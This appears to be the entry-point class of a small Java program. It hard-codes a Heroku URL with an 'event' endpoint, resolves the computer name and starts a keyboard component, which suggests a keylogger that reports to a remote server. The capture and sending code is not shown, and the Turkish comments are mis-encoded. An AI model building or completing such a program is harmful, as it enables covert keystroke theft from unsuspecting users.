package com.byrfb.main;

import com.byrfb.ComputerNameSettings.ComputerNameSolver;
import com.byrfb.connection.Connection;
import com.byrfb.keyboard.Keyboard;
/*
 * 
 * Bu sýnýf bizim ana baþlatýcý sýnýfýmýz
 * computer name solver zaten isim çözücü olduðu adýndan da belli
 * 
 */
public class Main {
	/*
	 * herokudan aldýðýmýz domain ve hostingin barýnmasý iþllemi yapýlmakta
	 * 
	 */
	public static final String url = "https://intense-cove-31943.herokuapp.com/";
	public static final String sendEvent = "event";

	public static void main(String[] args) {
		ComputerNameSolver solver = new ComputerNameSolver();
		Connection con = new Connection();
		Keyboard key = new Keyboard();
		key.start();
	}

}
